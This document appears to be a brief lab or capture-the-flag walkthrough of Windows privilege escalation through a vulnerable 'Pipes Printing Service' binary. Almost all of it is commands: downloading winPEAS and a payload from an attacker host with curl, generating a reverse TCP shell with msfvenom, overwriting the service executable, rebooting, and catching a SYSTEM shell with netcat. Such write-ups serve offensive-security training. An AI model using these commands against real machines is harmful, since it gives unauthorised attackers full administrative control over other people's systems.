# Upload winpeas.exe to enumerate the machine
```
curl http://192.168.49.80/winPEASany_ofs.exe -o winPEASany_ofs.exe
```
winPEASany_ofs.exe

found an unquoted service path vulnerable for "Pipes Printing Service"

```
icacls "C:\Program Files\Pipe Printing Service\PipesPrinting.exe
```

Icacls is a Windows command-line utility that IT admins can use to change access control lists on files and folders.

# Create payload using msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=662 -f exe > shell.exe
```

# Replace the original binary file with payload file and restart the machine
powershell
```
move "C:\Program Files\Pipes Printing Service\PipesPrinting.exe" "C:\Program Files\Pipes Printing Service\PipesPrinting.exe.backup"
```
```
curl http://192.168.49.80/shell.exe -o "C:\Program Files\Pipes Printing Service\PipesPrinting.exe"
```
shutdown /r /t 1

# Receive command shell on 662 port as "nt authority system"
```
nc -vlvvvvp 662
```
```
whoami
cd /users/Administrator/Desktop
type proof.txt
hostname
ipconfig
```
